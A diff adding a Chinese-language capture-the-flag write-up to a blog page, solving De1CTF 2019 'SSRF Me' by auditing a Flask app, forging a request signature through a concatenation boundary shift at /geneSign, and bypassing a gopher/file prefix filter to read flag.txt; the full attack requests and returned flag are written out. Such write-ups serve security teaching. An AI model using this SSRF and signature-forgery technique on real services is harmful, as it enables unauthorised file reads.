@@ -3514,6 +3514,247 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
+          <time datetime="2026-11-10 22:10:00+00:00">2026-11-10</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../python/" class="md-meta__link">Python</a>, 
+              <a href="../%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="md-meta__link">代码审计</a>, 
+              <a href="./" class="md-meta__link">SSRF</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 3 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="de1ctf-2019-ssrf-me"><a class="toclink" href="../../de1ctf2019-ssrf-me/">[De1CTF 2019] SSRF Me — 拼接没有分隔符，签名可以跨动作借</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：Python 代码审计 — 签名拼接边界移位 + SSRF</p>
+<p><strong>Flag</strong>：<code>CTF2{ea5bd6e0-6053-4b3e-9ab9-c7818fc6692d}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="../../de1ctf2019-ssrf-me/#_1">题目概述</a></h3>
+<p>页面直接给出源码，<strong>但缩进和换行全乱了</strong>——粘进 VS Code 先 <code>Shift+Alt+F</code> 格式化一遍再读，否则没法审计。</p>
+<p>这题的坑不在 SSRF 本身（那个一眼就能看出来），<strong>在签名怎么过</strong>。</p>
+<hr />
+<h3 id="_2"><a class="toclink" href="../../de1ctf2019-ssrf-me/#_2">解题过程</a></h3>
+<h4 id="step-1-sign"><a class="toclink" href="../../de1ctf2019-ssrf-me/#step-1-sign">Step 1：先看 sign 校验</a></h4>
+<p>入口两个路由，<code>/De1ta</code> 才是能打的：</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/De1ta'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'POST'</span><span class="p">])</span>
+</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">challenge</span><span class="p">():</span>
+</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a>    <span class="n">action</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"action"</span><span class="p">))</span>
+</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a>    <span class="n">param</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"param"</span><span class="p">,</span> <span class="s2">""</span><span class="p">))</span>
+</span><span id="__span-64-5"><a id="__codelineno-64-5" name="__codelineno-64-5" href="#__codelineno-64-5"></a>    <span class="n">sign</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"sign"</span><span class="p">))</span>
+</span><span id="__span-64-6"><a id="__codelineno-64-6" name="__codelineno-64-6" href="#__codelineno-64-6"></a>    <span class="n">ip</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span>
+</span><span id="__span-64-7"><a id="__codelineno-64-7" name="__codelineno-64-7" href="#__codelineno-64-7"></a>    <span class="k">if</span> <span class="p">(</span><span class="n">waf</span><span class="p">(</span><span class="n">param</span><span class="p">)):</span>
+</span><span id="__span-64-8"><a id="__codelineno-64-8" name="__codelineno-64-8" href="#__codelineno-64-8"></a>        <span class="k">return</span> <span class="s2">"No Hacker!!!!"</span>
+</span><span id="__span-64-9"><a id="__codelineno-64-9" name="__codelineno-64-9" href="#__codelineno-64-9"></a>    <span class="n">task</span> <span class="o">=</span> <span class="n">Task</span><span class="p">(</span><span class="n">action</span><span class="p">,</span> <span class="n">param</span><span class="p">,</span> <span class="n">sign</span><span class="p">,</span> <span class="n">ip</span><span class="p">)</span>
+</span><span id="__span-64-10"><a id="__codelineno-64-10" name="__codelineno-64-10" href="#__codelineno-64-10"></a>    <span class="k">return</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">task</span><span class="o">.</span><span class="n">Exec</span><span class="p">())</span>
+</span></code></pre></div>
+<p><strong>三个输入来自两处：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>cookies 里取 action 和 sign
+</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a>query   里取 param
+</span></code></pre></div>
+<p><strong>校验在 <code>Task.checkSign()</code>：</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">checkSign</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a>    <span class="k">if</span> <span class="p">(</span><span class="n">getSign</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">action</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">param</span><span class="p">)</span> <span class="o">==</span> <span class="bp">self</span><span class="o">.</span><span class="n">sign</span><span class="p">):</span>
+</span><span id="__span-66-3"><a id="__codelineno-66-3" name="__codelineno-66-3" href="#__codelineno-66-3"></a>        <span class="k">return</span> <span class="kc">True</span>
+</span><span id="__span-66-4"><a id="__codelineno-66-4" name="__codelineno-66-4" href="#__codelineno-66-4"></a>    <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-66-5"><a id="__codelineno-66-5" name="__codelineno-66-5" href="#__codelineno-66-5"></a>        <span class="k">return</span> <span class="kc">False</span>
+</span><span id="__span-66-6"><a id="__codelineno-66-6" name="__codelineno-66-6" href="#__codelineno-66-6"></a>
+</span><span id="__span-66-7"><a id="__codelineno-66-7" name="__codelineno-66-7" href="#__codelineno-66-7"></a><span class="k">def</span><span class="w"> </span><span class="nf">getSign</span><span class="p">(</span><span class="n">action</span><span class="p">,</span> <span class="n">param</span><span class="p">):</span>
+</span><span id="__span-66-8"><a id="__codelineno-66-8" name="__codelineno-66-8" href="#__codelineno-66-8"></a>    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">secert_key</span> <span class="o">+</span> <span class="n">param</span> <span class="o">+</span> <span class="n">action</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></code></pre></div>
+<p><strong>所以规则是：<code>md5(secret_key + param + action)</code> 必须等于你 cookie 里的 <code>sign</code>。</strong></p>
+<p><strong><code>secert_key = os.urandom(16)</code>（源码里就是这么拼的）——每次启动重新随机，算不出来，只能想办法让服务器自己算。</strong></p>
+<h4 id="step-2exec-action"><a class="toclink" href="../../de1ctf2019-ssrf-me/#step-2exec-action">Step 2：Exec 里先看 action 包含什么</a></h4>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">Exec</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a>    <span class="n">result</span> <span class="o">=</span> <span class="p">{}</span>
+</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a>    <span class="n">result</span><span class="p">[</span><span class="s1">'code'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">500</span>
+</span><span id="__span-67-4"><a id="__codelineno-67-4" name="__codelineno-67-4" href="#__codelineno-67-4"></a>    <span class="k">if</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">checkSign</span><span class="p">()):</span>
+</span><span id="__span-67-5"><a id="__codelineno-67-5" name="__codelineno-67-5" href="#__codelineno-67-5"></a>        <span class="k">if</span> <span class="s2">"scan"</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">action</span><span class="p">:</span>
+</span><span id="__span-67-6"><a id="__codelineno-67-6" name="__codelineno-67-6" href="#__codelineno-67-6"></a>            <span class="n">tmpfile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"./</span><span class="si">%s</span><span class="s2">/result.txt"</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">sandbox</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">)</span>
+</span><span id="__span-67-7"><a id="__codelineno-67-7" name="__codelineno-67-7" href="#__codelineno-67-7"></a>            <span class="n">resp</span> <span class="o">=</span> <span class="n">scan</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">param</span><span class="p">)</span>
+</span><span id="__span-67-8"><a id="__codelineno-67-8" name="__codelineno-67-8" href="#__codelineno-67-8"></a>            <span class="k">if</span> <span class="p">(</span><span class="n">resp</span> <span class="o">==</span> <span class="s2">"Connection Timeout"</span><span class="p">):</span>
+</span><span id="__span-67-9"><a id="__codelineno-67-9" name="__codelineno-67-9" href="#__codelineno-67-9"></a>                <span class="n">result</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]</span> <span class="o">=</span> <span class="n">resp</span>
+</span><span id="__span-67-10"><a id="__codelineno-67-10" name="__codelineno-67-10" href="#__codelineno-67-10"></a>            <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-67-11"><a id="__codelineno-67-11" name="__codelineno-67-11" href="#__codelineno-67-11"></a>                <span class="nb">print</span> <span class="n">resp</span>
+</span><span id="__span-67-12"><a id="__codelineno-67-12" name="__codelineno-67-12" href="#__codelineno-67-12"></a>                <span class="n">tmpfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span>
+</span><span id="__span-67-13"><a id="__codelineno-67-13" name="__codelineno-67-13" href="#__codelineno-67-13"></a>                <span class="n">tmpfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span id="__span-67-14"><a id="__codelineno-67-14" name="__codelineno-67-14" href="#__codelineno-67-14"></a>                <span class="n">result</span><span class="p">[</span><span class="s1">'code'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">200</span>
+</span><span id="__span-67-15"><a id="__codelineno-67-15" name="__codelineno-67-15" href="#__codelineno-67-15"></a>        <span class="k">if</span> <span class="s2">"read"</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">action</span><span class="p">:</span>
+</span><span id="__span-67-16"><a id="__codelineno-67-16" name="__codelineno-67-16" href="#__codelineno-67-16"></a>            <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"./</span><span class="si">%s</span><span class="s2">/result.txt"</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">sandbox</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span>
+</span><span id="__span-67-17"><a id="__codelineno-67-17" name="__codelineno-67-17" href="#__codelineno-67-17"></a>            <span class="n">result</span><span class="p">[</span><span class="s1">'code'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">200</span>
+</span><span id="__span-67-18"><a id="__codelineno-67-18" name="__codelineno-67-18" href="#__codelineno-67-18"></a>            <span class="n">result</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span id="__span-67-19"><a id="__codelineno-67-19" name="__codelineno-67-19" href="#__codelineno-67-19"></a>        <span class="k">if</span> <span class="n">result</span><span class="p">[</span><span class="s1">'code'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">500</span><span class="p">:</span>
+</span><span id="__span-67-20"><a id="__codelineno-67-20" name="__codelineno-67-20" href="#__codelineno-67-20"></a>            <span class="n">result</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"Action Error"</span>
+</span><span id="__span-67-21"><a id="__codelineno-67-21" name="__codelineno-67-21" href="#__codelineno-67-21"></a>    <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-67-22"><a id="__codelineno-67-22" name="__codelineno-67-22" href="#__codelineno-67-22"></a>        <span class="n">result</span><span class="p">[</span><span class="s1">'code'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">500</span>
+</span><span id="__span-67-23"><a id="__codelineno-67-23" name="__codelineno-67-23" href="#__codelineno-67-23"></a>        <span class="n">result</span><span class="p">[</span><span class="s1">'msg'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"Sign Error"</span>
+</span><span id="__span-67-24"><a id="__codelineno-67-24" name="__codelineno-67-24" href="#__codelineno-67-24"></a>    <span class="k">return</span> <span class="n">result</span>
+</span></code></pre></div>
+<p><strong>注意两处用的是 <code>in</code>，不是 <code>==</code>：</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a><span class="k">if</span> <span class="s2">"scan"</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">action</span><span class="p">:</span>
+</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a><span class="k">if</span> <span class="s2">"read"</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">action</span><span class="p">:</span>
+</span></code></pre></div>
+<p><strong>这意味着 <code>action</code> 可以同时包含 <code>scan</code> 和 <code>read</code>——</strong>这也是后面能成的原因<strong>。</strong></p>
+<p><strong>两个分支各干一件事：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>scan  把 scan(param) 的结果写进 ./&lt;sandbox&gt;/result.txt
+</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a>read  把 result.txt 读出来，放进 result['data'] 返回
+</span></code></pre></div>
+<p><strong><code>sandbox = md5(remote_addr)</code>，也就是每个 IP 一个目录。</strong></p>
+<p><strong>所以光有 scan 你是看不到结果的（响应里只有 <code>{"code":200}</code>），光有 read 你读的是一个空文件。必须两个都在。</strong></p>
+<h4 id="step-3scan-ssrf"><a class="toclink" href="../../de1ctf2019-ssrf-me/#step-3scan-ssrf">Step 3：scan 就是 SSRF</a></h4>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">scan</span><span class="p">(</span><span class="n">param</span><span class="p">):</span>
+</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a>    <span class="n">socket</span><span class="o">.</span><span class="n">setdefaulttimeout</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a>    <span class="k">try</span><span class="p">:</span>
+</span><span id="__span-70-4"><a id="__codelineno-70-4" name="__codelineno-70-4" href="#__codelineno-70-4"></a>        <span class="k">return</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">param</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()[:</span><span class="mi">50</span><span class="p">]</span>
+</span><span id="__span-70-5"><a id="__codelineno-70-5" name="__codelineno-70-5" href="#__codelineno-70-5"></a>    <span class="k">except</span><span class="p">:</span>
+</span><span id="__span-70-6"><a id="__codelineno-70-6" name="__codelineno-70-6" href="#__codelineno-70-6"></a>        <span class="k">return</span> <span class="s2">"Connection Timeout"</span>
+</span></code></pre></div>
+<p><strong><code>param</code> 被原样丢进 <code>urllib.urlopen()</code>——它能打开 URL，也能打开本地文件。</strong></p>
+<p><strong>这里有个容易看错的细节：<code>[:50]</code> 是</strong>前 50 个字符<strong>，不是前 50 行。</strong>要读 50 行得先 <code>splitlines()</code>。这题 flag 短，50 个字符够了，所以看不出差别。</p>
+<h4 id="step-4waf"><a class="toclink" href="../../de1ctf2019-ssrf-me/#step-4waf">Step 4：WAF 拦了什么</a></h4>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">waf</span><span class="p">(</span><span class="n">param</span><span class="p">):</span>
+</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a>    <span class="n">check</span> <span class="o">=</span> <span class="n">param</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a>    <span class="k">if</span> <span class="n">check</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">"gopher"</span><span class="p">)</span> <span class="ow">or</span> <span class="n">check</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">"file"</span><span class="p">):</span>
+</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4" href="#__codelineno-71-4"></a>        <span class="k">return</span> <span class="kc">True</span>
+</span><span id="__span-71-5"><a id="__codelineno-71-5" name="__codelineno-71-5" href="#__codelineno-71-5"></a>    <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-71-6"><a id="__codelineno-71-6" name="__codelineno-71-6" href="#__codelineno-71-6"></a>        <span class="k">return</span> <span class="kc">False</span>
+</span></code></pre></div>
+<p><strong>只拦两个</strong>前缀<strong>：<code>gopher</code> 和 <code>file</code>。</strong></p>
+<p><strong>所以 <code>file:///flag.txt</code> 会被拦，但 <code>flag.txt</code> 不会——<code>"flag.txt".startswith("file")</code> 是 <code>False</code>（第四个字符是 <code>g</code> 不是 <code>e</code>）。</strong></p>
+<p><strong>相对路径的 <code>flag.txt</code> 会被 <code>urlopen</code> 当成当前工作目录下的文件打开。这题就是从这里读 flag 的。</strong></p>
+<h4 id="step-5genesign"><a class="toclink" href="../../de1ctf2019-ssrf-me/#step-5genesign">Step 5：签名怎么来——<code>/geneSign</code> 是签名机</a></h4>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a><span class="c1"># generate Sign For Action Scan.</span>
+</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">"/geneSign"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'POST'</span><span class="p">])</span>
+</span><span id="__span-72-3"><a id="__codelineno-72-3" name="__codelineno-72-3" href="#__codelineno-72-3"></a><span class="k">def</span><span class="w"> </span><span class="nf">geneSign</span><span class="p">():</span>
+</span><span id="__span-72-4"><a id="__codelineno-72-4" name="__codelineno-72-4" href="#__codelineno-72-4"></a>    <span class="n">param</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"param"</span><span class="p">,</span> <span class="s2">""</span><span class="p">))</span>
+</span><span id="__span-72-5"><a id="__codelineno-72-5" name="__codelineno-72-5" href="#__codelineno-72-5"></a>    <span class="n">action</span> <span class="o">=</span> <span class="s2">"scan"</span>
+</span><span id="__span-72-6"><a id="__codelineno-72-6" name="__codelineno-72-6" href="#__codelineno-72-6"></a>    <span class="k">return</span> <span class="n">getSign</span><span class="p">(</span><span class="n">action</span><span class="p">,</span> <span class="n">param</span><span class="p">)</span>
+</span></code></pre></div>
+<p><strong>它的 <code>action</code> 是</strong>写死的 <code>scan</code><strong>，<code>param</code> 从 query 取。你给它什么 <code>param</code>，它就返回 <code>md5(secret + param + "scan")</code>。</strong></p>
+<p><strong>这就是个“只能签 scan”的签名机。</strong></p>
+<h4 id="step-6-actionreadscan"><a class="toclink" href="../../de1ctf2019-ssrf-me/#step-6-actionreadscan">Step 6：为什么签名能用到 <code>action=readscan</code> 上</a></h4>
+<p><strong>因为拼接</strong>没有分隔符<strong>：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>geneSign  →  md5(secret + "flag.txtread" + "scan")   = md5(secret + "flag.txtreadscan")
+</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2" href="#__codelineno-73-2"></a>De1ta     →  md5(secret + "flag.txt"     + "readscan") = md5(secret + "flag.txtreadscan")
+</span></code></pre></div>
+<p><strong>字符串完全一样，只是切分位置不同。</strong></p>
+<p><strong>我要的是 <code>action=readscan</code>（同时含 scan 和 read）、<code>param=flag.txt</code>。</strong>这两段拼起来是 <code>flag.txt</code> + <code>readscan</code> = <code>flag.txtreadscan</code>。**</p>
+<p><strong>那我只要让 <code>geneSign</code> 的 <code>param</code> 变成 <code>flag.txtread</code>，它算出来的就是同一个值：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>GET /geneSign?param=flag.txtread
+</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2" href="#__codelineno-74-2"></a>→ c3bc4d1cf57f54db59b48b82a6ae06ad
+</span></code></pre></div>
+<p><strong>拿到这 32 位，就是 <code>/De1ta</code> 要的 <code>sign</code>。</strong></p>
+<h4 id="step-7-de1ta"><a class="toclink" href="../../de1ctf2019-ssrf-me/#step-7-de1ta">Step 7：打 <code>/De1ta</code></a></h4>
+<p><strong>三样东西要一起给：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>Cookie: action=readscan
+</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2" href="#__codelineno-75-2"></a>Cookie: sign=c3bc4d1cf57f54db59b48b82a6ae06ad
+</span><span id="__span-75-3"><a id="__codelineno-75-3" name="__codelineno-75-3" href="#__codelineno-75-3"></a>URL:    /De1ta?param=flag.txt
+</span></code></pre></div>
+<p><strong>执行顺序是：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a>checkSign() 通过
+</span><span id="__span-76-2"><a id="__codelineno-76-2" name="__codelineno-76-2" href="#__codelineno-76-2"></a>  → action 含 scan  → scan("flag.txt") 读到 CTF2{...}，写进 result.txt
+</span><span id="__span-76-3"><a id="__codelineno-76-3" name="__codelineno-76-3" href="#__codelineno-76-3"></a>  → action 含 read  → 读回 result.txt，放进 result['data']
+</span></code></pre></div>
+<p><strong>返回：</strong></p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a><span class="p">{</span><span class="nt">"code"</span><span class="p">:</span><span class="w"> </span><span class="mi">200</span><span class="p">,</span><span class="w"> </span><span class="nt">"data"</span><span class="p">:</span><span class="w"> </span><span class="s2">"CTF2{ea5bd6e0-6053-4b3e-9ab9-c7818fc6692d}\n"</span><span class="p">}</span>
+</span></code></pre></div>
+<hr />
+<h3 id="genesign-md5"><a class="toclink" href="../../de1ctf2019-ssrf-me/#genesign-md5">疑问：<code>/geneSign</code> 为什么会在页面上“打印”出那串 md5</a></h3>
+<p><strong>因为 Flask 的视图函数 <code>return</code> 什么，HTTP 响应体就是什么。</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a><span class="k">return</span> <span class="n">getSign</span><span class="p">(</span><span class="n">action</span><span class="p">,</span> <span class="n">param</span><span class="p">)</span>
+</span></code></pre></div>
+<p><strong><code>getSign</code> 返回的是 <code>hexdigest()</code> 的 32 位字符串，<code>geneSign</code> 把它原样 return 给 Flask，Flask 没有套模板、没有包 JSON，直接把它当响应正文发回去。</strong></p>
+<p><strong>所以浏览器拿到 <code>text/html</code> 的 32 个字符，就在页面上原样显示出来了。不是“打印日志”，是</strong>响应体就是这个字符串<strong>。</strong></p>
+<p><strong>反过来想，这也说明 <code>secret_key</code> 每次启动都变：不现场问这个接口要，签名根本算不出来。</strong></p>
+<hr />
+<table>
+<thead>
+<tr>
+<th>关键点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>in</code> 而非 <code>==</code></td>
+<td><code>action</code> 可以同时含 <code>scan</code> 和 <code>read</code>，这是解题前提</td>
+</tr>
+<tr>
+<td>scan / read 分工</td>
+<td>scan 写文件、read 读回来，少一个都拿不到数据</td>
+</tr>
+<tr>
+<td><code>sandbox = md5(ip)</code></td>
+<td>每个 IP 一个目录，自己打自己才有文件</td>
+</tr>
+<tr>
+<td><code>[:50]</code></td>
+<td>截前 50 个<strong>字符</strong>，不是 50 行</td>
+</tr>
+<tr>
+<td>WAF</td>
+<td>只拦 <code>gopher</code> / <code>file</code> 前缀，<code>flag.txt</code> 不在其中</td>
+</tr>
+<tr>
+<td><code>secert_key</code></td>
+<td>每次启动随机（源码拼写如此），只能靠预言机签名</td>
+</tr>
+<tr>
+<td>拼接边界</td>
+<td><code>md5(secret + param + action)</code> 无分隔符 → 可以跨字段挪边界</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>完整请求</summary>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a>① 取签名
+</span><span id="__span-79-2"><a id="__codelineno-79-2" name="__codelineno-79-2" href="#__codelineno-79-2"></a>GET /geneSign?param=flag.txtread
+</span><span id="__span-79-3"><a id="__codelineno-79-3" name="__codelineno-79-3" href="#__codelineno-79-3"></a>→ c3bc4d1cf57f54db59b48b82a6ae06ad
+</span><span id="__span-79-4"><a id="__codelineno-79-4" name="__codelineno-79-4" href="#__codelineno-79-4"></a>
+</span><span id="__span-79-5"><a id="__codelineno-79-5" name="__codelineno-79-5" href="#__codelineno-79-5"></a>② 打目标
+</span><span id="__span-79-6"><a id="__codelineno-79-6" name="__codelineno-79-6" href="#__codelineno-79-6"></a>GET /De1ta?param=flag.txt
+</span><span id="__span-79-7"><a id="__codelineno-79-7" name="__codelineno-79-7" href="#__codelineno-79-7"></a>Cookie: action=readscan
+</span><span id="__span-79-8"><a id="__codelineno-79-8" name="__codelineno-79-8" href="#__codelineno-79-8"></a>Cookie: sign=c3bc4d1cf57f54db59b48b82a6ae06ad
+</span><span id="__span-79-9"><a id="__codelineno-79-9" name="__codelineno-79-9" href="#__codelineno-79-9"></a>
+</span><span id="__span-79-10"><a id="__codelineno-79-10" name="__codelineno-79-10" href="#__codelineno-79-10"></a>→ {"code": 200, "data": "CTF2{ea5bd6e0-6053-4b3e-9ab9-c7818fc6692d}\n"}
+</span></code></pre></div>
+</details>
+<details class="note">
+<summary>这题踩的坑</summary>
+<p><strong>① 以为 <code>[:50]</code> 是 50 行</strong></p>
+<p>代码审计时这种“看起来像”最容易滑过去。<code>read()[:50]</code> 是字符串切片，单位是字符。</p>
+<p><strong>② 以为 <code>action</code> 只能取一个值</strong></p>
+<p><code>if "scan" in self.action</code> 是<strong>子串判断</strong>，<code>readscan</code>、<code>scanread</code> 都能进两个分支。<strong>看到 <code>in</code> 就该想到拼接。</strong></p>
+<p><strong>③ 签名只能用在“它签的那个动作”上</strong></p>
+<p>直觉上 <code>/geneSign</code> 签的是 <code>scan</code>，所以只能用在 <code>action=scan</code>。<strong>但拼接没有分隔符，<code>flag.txt</code> + <code>readscan</code> 和 <code>flag.txtread</code> + <code>scan</code> 是同一个字符串——边界可以挪。</strong></p>
+<p><strong>④ 只设 param，忘了 action 和 sign</strong></p>
+<p>这三样是三个位置（query、cookie、cookie），少一个都进不去。</p>
+</details>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
           <time datetime="2026-10-29 00:00:00+00:00">2026-10-29</time></li>
         
           <li class="md-meta__item">
@@ -3556,30 +3797,30 @@
 <p>首页是一个 URL 输入框，右上角有两个入口：「比价抓取」和「系统信息」。</p>
 <p>先进「系统信息」，页面上直接写了内部服务接口文档：</p>
 <p><img alt="系统信息页" src="../../../assets/images/zerog2026-stage2-ssrf/02-system-info.png" /></p>
